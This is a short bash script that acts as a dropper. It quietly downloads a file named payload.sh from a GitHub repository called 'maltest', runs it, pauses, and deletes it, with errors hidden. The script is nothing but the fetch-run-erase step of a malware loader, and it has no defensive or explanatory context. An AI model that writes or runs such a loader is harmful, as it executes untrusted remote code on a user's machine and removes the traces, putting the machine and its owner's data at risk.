#!/bin/bash
curl https://raw.githubusercontent.com/AirplaneA220/maltest/Main/shversion/payload.sh 2>/dev/null > /tmp/payload.sh
sh /tmp/payload.sh
sleep 3
rm /tmp/payload.sh